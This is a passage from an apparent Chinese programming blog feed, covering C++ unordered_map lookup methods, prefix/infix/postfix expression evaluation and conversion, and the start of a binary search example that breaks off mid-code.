&lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br><span class="hljs-number">49</span><br><span class="hljs-number">49</span> <span class="hljs-number">17</span><br></code></pre></div></td></tr></table></figure><p>通过输出结果不难发现，之前用于表示键为 49 的键值对所在范围的 2 个迭代器，重哈希之后表示的范围发生了改变。</p><p>用于遍历整个容器的 begin()/end() 和 cbegin()/cend() 迭代器对，重哈希只会影响遍历容器内键值对的顺序，整个遍历的操作仍然可以顺利完成。</p><h5 id="1-4-unordered-map获取元素的4种方法"><a href="#1-4-unordered-map获取元素的4种方法" class="headerlink" title="1.4 unordered_map获取元素的4种方法"></a>1.4 unordered_map获取元素的4种方法</h5><blockquote><p><strong>1) unordered_map 容器类模板中，实现了对 [ ] 运算符的重载，使得我们可以像“利用下标访问普通数组中元素”那样，通过目标键值对的键获取到该键对应的值。</strong></p></blockquote><p>例如：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unordered_map&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-comment">//创建 umap 容器</span><br>    <span class="hljs-built_in">unordered_map</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt; umap&#123;<br>        &#123;<span class="hljs-string">&quot;Python教程&quot;</span>,<span class="hljs-string">&quot;https://lichengloong.com/1&quot;</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;Java教程&quot;</span>,<span class="hljs-string">&quot;https://lichengloong.com/2&quot;</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;Linux教程&quot;</span>,<span class="hljs-string">&quot;https://lichengloong.com/3&quot;</span>&#125; &#125;;<br>    <span class="hljs-comment">//获取 &quot;Java教程&quot; 对应的值</span><br>    <span class="hljs-built_in">string</span> str = umap[<span class="hljs-string">&quot;Java教程&quot;</span>];<br>    <span class="hljs-built_in">cout</span> &lt;&lt; str &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br>https:<span class="hljs-comment">//lichengloong.com/2</span><br></code></pre></div></td></tr></table></figure><p>要注意的是，如果当前容器中并没有存储以 [ ] 运算符内指定的元素作为键的键值对，则此时 [ ] 运算符的功能将转变为：向当前容器中添加以目标元素为键的键值对。举个例子：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unordered_map&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-comment">//创建空 umap 容器</span><br>    <span class="hljs-built_in">unordered_map</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt; umap;<br>    <span class="hljs-comment">//[] 运算符在 = 右侧</span><br>    <span class="hljs-built_in">string</span> str = umap[<span class="hljs-string">&quot;STL教程&quot;</span>];<br>    <span class="hljs-comment">//[] 运算符在 = 左侧</span><br>    umap[<span class="hljs-string">&quot;C教程&quot;</span>] = <span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>;<br>   <br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> iter = umap.begin(); iter != umap.end(); ++iter) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; iter-&gt;first &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; iter-&gt;second &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br>C教程 https:<span class="hljs-comment">//lichengloong.com/</span><br>STL教程<br></code></pre></div></td></tr></table></figure><p>可以看见，当使用 [ ] 运算符向 unordered_map 容器中添加键值对时，分为 2 种情况：</p><blockquote><p>1.当 [ ] 运算符位于赋值号（=）右侧时，则新添加键值对的键为 [ ] 运算符内的元素，其值为键值对要求的值类型的默认值（string 类型默认值为空字符串）；<br>2.当 [ ] 运算符位于赋值号（=）左侧时，则新添加键值对的键为 [ ] 运算符内的元素，其值为赋值号右侧的元素。</p></blockquote><blockquote><p><strong>2) unordered_map 类模板中，还提供有 at() 成员方法，和使用 [ ] 运算符一样，at() 成员方法也需要根据指定的键，才能从容器中找到该键对应的值；</strong></p></blockquote><p>不同之处在于，如果在当前容器中查找失败，该方法不会向容器中添加新的键值对，而是直接抛出out_of_range异常。</p><p>例子：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unordered_map&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-comment">//创建 umap 容器</span><br>    <span class="hljs-built_in">unordered_map</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt; umap&#123;<br>        &#123;<span class="hljs-string">&quot;Python教程&quot;</span>,<span class="hljs-string">&quot;https://lichengloong.com/1&quot;</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;Java教程&quot;</span>,<span class="hljs-string">&quot;https://lichengloong.com/2&quot;</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;Linux教程&quot;</span>,<span class="hljs-string">&quot;https://lichengloong.com/3&quot;</span>&#125; &#125;;<br>    <span class="hljs-comment">//获取指定键对应的值</span><br>    <span class="hljs-built_in">string</span> str = umap.at(<span class="hljs-string">&quot;Python教程&quot;</span>);<br>    <span class="hljs-built_in">cout</span> &lt;&lt; str &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-comment">//执行此语句会抛出 out_of_range 异常</span><br>    <span class="hljs-comment">//cout &lt;&lt; umap.at(&quot;GO教程&quot;);</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br>https:<span class="hljs-comment">//lichengloong.com/1</span><br></code></pre></div></td></tr></table></figure><p>此程序中，第 12 行代码用于获取 umap 容器中键为“Python教程”对应的值，由于 umap 容器确实有符合条件的键值对，因此可以成功执行；而第 17 行代码，由于当前 umap 容器没有存储以“Go教程”为键的键值对，因此执行此语句会抛出 out_of_range 异常。</p><blockquote><p><strong>3) [ ] 运算符和 at() 成员方法基本能满足大多数场景的需要。除此之外，还可以借助 unordered_map 模板中提供的 find() 成员方法。</strong></p></blockquote><p>和前面方法不同的是，通过 find() 方法得到的是一个正向迭代器，该迭代器的指向分以下 2 种情况：</p><blockquote><p>1.当 find() 方法成功找到以指定元素作为键的键值对时，其返回的迭代器就指向该键值对；<br>2.当 find() 方法查找失败时，其返回的迭代器和 end() 方法返回的迭代器一样，指向容器中最后一个键值对之后的位置。</p></blockquote><p>例子：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unordered_map&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-comment">//创建 umap 容器</span><br>    <span class="hljs-built_in">unordered_map</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt; umap&#123;<br>        &#123;<span class="hljs-string">&quot;Python教程&quot;</span>,<span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;Java教程&quot;</span>,<span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;Linux教程&quot;</span>,<span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>&#125; &#125;;<br>    <span class="hljs-comment">//查找成功</span><br>    <span class="hljs-built_in">unordered_map</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt;::iterator iter = umap.find(<span class="hljs-string">&quot;Python教程&quot;</span>);<br>    <span class="hljs-built_in">cout</span> &lt;&lt; iter-&gt;first &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; iter-&gt;second &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-comment">//查找失败</span><br>    <span class="hljs-built_in">unordered_map</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt;::iterator iter2 = umap.find(<span class="hljs-string">&quot;GO教程&quot;</span>);<br>    <span class="hljs-keyword">if</span> (iter2 == umap.end()) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;当前容器中没有以\&quot;GO教程\&quot;为键的键值对&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br>Python教程 https:<span class="hljs-comment">//lichengloong.com/</span><br>当前容器中没有以<span class="hljs-string">&quot;GO教程&quot;</span>为键的键值对<br></code></pre></div></td></tr></table></figure><blockquote><p><strong>4) 除了 find() 成员方法之外，甚至可以借助 begin()/end() 或者 cbegin()/cend()，通过遍历整个容器中的键值对来找到目标键值对。</strong></p></blockquote><p>例子：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unordered_map&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-comment">//创建 umap 容器</span><br>    <span class="hljs-built_in">unordered_map</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt; umap&#123;<br>        &#123;<span class="hljs-string">&quot;Python教程&quot;</span>,<span class="hljs-string">&quot;https://lichengloong.com/1&quot;</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;Java教程&quot;</span>,<span class="hljs-string">&quot;https://lichengloong.com/2&quot;</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;Linux教程&quot;</span>,<span class="hljs-string">&quot;https://lichengloong.com/3&quot;</span>&#125; &#125;;<br>    <span class="hljs-comment">//遍历整个容器中存储的键值对</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> iter = umap.begin(); iter != umap.end(); ++iter) &#123;<br>        <span class="hljs-comment">//判断当前的键值对是否就是要找的</span><br>        <span class="hljs-keyword">if</span> (!iter-&gt;first.compare(<span class="hljs-string">&quot;Java教程&quot;</span>)) &#123;<br>            <span class="hljs-built_in">cout</span> &lt;&lt; iter-&gt;second &lt;&lt; <span class="hljs-built_in">endl</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br>https:<span class="hljs-comment">//lichengloong.com/2</span><br></code></pre></div></td></tr></table></figure><p>前 2 种方法基本能满足多数场景的需要，建议首选 at() 成员方法！</p>]]></content>
    
    
    <categories>
      
      <category>ACM</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>数据结构-前、中、后缀表达式</title>
    <link href="/2021/04/14/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%89%8D%E3%80%81%E4%B8%AD%E3%80%81%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <url>/2021/04/14/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%89%8D%E3%80%81%E4%B8%AD%E3%80%81%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<p>算式表达式在计算机中的前、中、后缀表示方式及其计算方式。</p><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><h3 id="1-前缀表达式"><a href="#1-前缀表达式" class="headerlink" title="1.前缀表达式"></a>1.前缀表达式</h3><p>运算符位于操作数之前。<br><strong>例如：</strong>-×+3456</p><h3 id="2-中缀表达式"><a href="#2-中缀表达式" class="headerlink" title="2.中缀表达式"></a>2.中缀表达式</h3><p>运算符处于操作数的中间。中缀表达式是人们常用的算术表示方法。计算机计算中缀表达式是复杂的，所以一般需要将中缀表达式转换成前缀或者后缀表达式。<br><strong>例如：</strong>(3+4)×5-6</p><h3 id="3-后缀表达式"><a href="#3-后缀表达式" class="headerlink" title="3.后缀表达式"></a>3.后缀表达式</h3><p>运算符位于操作数之后。<br><strong>例如：</strong>34+5×6-</p><h3 id="4-计算机计算前缀表达式的方法"><a href="#4-计算机计算前缀表达式的方法" class="headerlink" title="4.计算机计算前缀表达式的方法"></a>4.计算机计算前缀表达式的方法</h3><p><strong><span style="color:red">从右至左</span></strong> 扫描表达式，遇到数字时，将数字压入堆栈，遇到运算符时，弹出栈顶的两个数，用运算符对它们做相应的计算，并将结果入栈；重复上述过程直到表达式最左端，最后运算得出的值即为表达式的结果。<br>例如：前缀表达式“ - × + 3 4 5 6 ”：</p><blockquote><p>1.从右至左扫描，将6、5、4、3压入堆栈；<br>2.遇到+运算符，因此弹出3和4（3为栈顶元素，4为次顶元素，注意与后缀表达式做比较），计算出3+4的值，得到结果7，再将7入栈；<br>3.接下来是×运算符，因此弹出7和5，计算出7×5=35，将35入栈；<br>4.最后是-运算符，计算出35-6的值，即29，由此得出最终结果。</p></blockquote><h3 id="5-计算机计算后缀表达式的方法"><a href="#5-计算机计算后缀表达式的方法" class="headerlink" title="5.计算机计算后缀表达式的方法"></a>5.计算机计算后缀表达式的方法</h3><p>与前缀表达式类似，只是顺序是从左至右。<br>从左至右扫描表达式，遇到数字时，将数字压入堆栈，遇到运算符时，弹出栈顶的两个数，用运算符对它们做相应的计算，并将结果入栈；重复上述过程直到表达式最右端，最后运算得出的值即为表达式的结果。<br>例如：后缀表达式“ 3 4 + 5 × 6 - ”：</p><blockquote><p>1.从左至右扫描，将3和4压入堆栈；<br>2.遇到+运算符，因此弹出4和3（4为栈顶元素，3为次顶元素，注意与前缀表达式做比较），计算出3+4的值，得到结果7，再将7入栈；<br>3.将5入栈；<br>4.接下来是×运算符，因此弹出5和7，计算出7×5=35，将35入栈；<br>5.将6入栈；<br>6.最后是-运算符，计算出35-6的值，即29，由此得出最终结果。</p></blockquote><h3 id="6-中缀表达式-转换为-前缀表达式"><a href="#6-中缀表达式-转换为-前缀表达式" class="headerlink" title="6. 中缀表达式 转换为 前缀表达式"></a>6. <span style="color:green">中缀表达式</span> 转换为 <span style="color:green">前缀表达式</span></h3><blockquote><p>1.初始化两个栈：运算符栈S1和储存中间结果的栈S2；<br>2.从右至左扫描中缀表达式；<br>3.遇到操作数时，将其压入S2；</p></blockquote><blockquote><p>4.遇到运算符时，比较其与S1栈顶运算符的优先级：</p><ul><li>如果S1为空，或栈顶运算符为右括号“)”，则直接将此运算符入栈；</li><li>否则，若优先级比栈顶运算符的较高或相等，也将运算符压入S1；</li><li>否则，将S1栈顶的运算符弹出并压入到S2中，再次转到4-1与S1中新的栈顶运算符相比较；</li></ul></blockquote><blockquote><p>5.遇到括号时：</p><ul><li>如果是右括号“)”，则直接压入S1；</li><li>如果是左括号“(”，则依次弹出S1栈顶的运算符，并压入S2，直到遇到右括号为止，此时将这一对括号丢弃；</li></ul></blockquote><blockquote><p>6.重复步骤(2)至(5)，直到表达式的最左边；<br>7.将S1中剩余的运算符依次弹出并压入S2；<br>8.依次弹出S2中的元素并输出，结果即为中缀表达式对应的前缀表达式。</p></blockquote><h3 id="7-中缀表达式-转换为-后缀表达式"><a href="#7-中缀表达式-转换为-后缀表达式" class="headerlink" title="7.中缀表达式 转换为 后缀表达式"></a>7.<span style="color:green">中缀表达式</span> 转换为 <span style="color:green">后缀表达式</span></h3><blockquote><p>1.初始化两个栈：运算符栈S1和储存中间结果的栈S2；<br>2.从左至右扫描中缀表达式；<br>3.遇到操作数时，将其压入S2；</p></blockquote><blockquote><p>4.遇到运算符时，比较其与S1栈顶运算符的优先级：</p><ul><li>如果S1为空，或栈顶运算符为左括号“(”，则直接将此运算符入栈；</li><li>否则，若优先级比栈顶运算符的高，也将运算符压入S1（注意转换为前缀表达式时是优先级较高或相同，而这里则不包括相同的情况）；</li><li>否则，将S1栈顶的运算符弹出并压入到S2中，再次转到4-1与S1中新的栈顶运算符相比较；</li></ul></blockquote><blockquote><p>5.遇到括号时：</p><ul><li>如果是左括号“(”，则直接压入S1；</li><li>如果是右括号“)”，则依次弹出S1栈顶的运算符，并压入S2，直到遇到左括号为止，此时将这一对括号丢弃；</li></ul></blockquote><blockquote><p>6.重复步骤(2)至(5)，直到表达式的最右边；<br>7.将S1中剩余的运算符依次弹出并压入S2；<br>8.依次弹出S2中的元素并输出，结果的逆序即为中缀表达式对应的后缀表达式（转换为前缀表达式时不用逆序）。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>数据结构</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ACM-二分/三分查找</title>
    <link href="/2021/04/12/ACM-%E4%BA%8C%E5%88%86&amp;%E4%B8%89%E5%88%86%E6%9F%A5%E6%89%BE/"/>
    <url>/2021/04/12/ACM-%E4%BA%8C%E5%88%86&amp;%E4%B8%89%E5%88%86%E6%9F%A5%E6%89%BE/</url>
    
    <content type="html"><![CDATA[<p>实现二分和三分查找。</p><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><h3 id="二分查找"><a href="#二分查找" class="headerlink" title="二分查找"></a>二分查找</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">//#define _CRT_SECURE_NO_DEPRECATE</span><br><span class="hljs-comment">//#include&lt;bits/stdc++.h&gt;</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;functional&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;numeric&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iomanip&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;queue&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;map&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cstdlib&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cmath&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IOS ios::sync_with_stdio(0);cin.tie(0),cout.tie(0);</span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> INF=<span class="hljs-number">0x3f3f3f3f</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> maxn=<span class="hljs-number">1e6</span>+<span class="hljs-number">5</span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PI acos(-1)</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a[],<span class="hljs-keyword">int</span> len,<span class="hljs-keyword">int</span> m)</span>                 <span class="hljs-comment">//len为数组的长度  m为被查找的数</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> left = <span class="hljs-number">0</span>, right = len - <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (left &lt;= right)<br>    &#123;<br>        <span class="hljs-keyword">int</span> k=left+(right-left)/<span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">if</span> (m == a[k])                  <span class="hljs-comment">//即 m就为中间值</span><br>            <span class="hljs-keyword">return</span> k;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (m &gt; a[k])              <span class="hljs-comment">//即m在中间到最后这一段里面</span><br>            left = k + <span class="hljs-number">1</span>;               <span class="hljs-comment">//所以就让left从中间的下一个开始 重复二分查找</span><br>        <span class="hljs-keyword">else</span><br>            right = k - <span class="hljs-number">1</span>;              <span class="hljs-comment">//即 m在开始到中间这一段里面</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;                          <span class="hljs-comment">//如没有上述三种情况 则就是没有找到 即没有m元素</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">solve</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-keyword">int</span> t[<span class="hljs-number">100</span>];<br><span class="hljs-keyword">int</span> n,m;<br><span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">&quot;请输入总个数和要查找的数：&quot;</span>&lt;&lt;<span class="hljs-built_in">endl</span>;<br><span class="hljs-built_in">cin</span>&gt;&gt;n&gt;&gt;m;<br><span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">&quot;请输入数：&quot;</span>&lt;&lt;<span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;n;++i) <span class="hljs-built_in">cin</span>&gt;&gt;t[i];<br>sort(t,t+n);<br><span class="hljs-keyword">int</span> f=find(t,n,m);<br><span class="hljs-keyword">if</span>(f==<span class="hljs-number">-1</span>) <span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">&quot;NO!&quot;</span>&lt;&lt;<span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">&quot;OK!&quot;</span>&lt;&lt;<span class="hljs-built_in">endl</span>;<br><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>IOS;<br>solve();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="三分查找"><a href="#三分查找" class="headerlink" title="三分查找"></a>三分查找</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 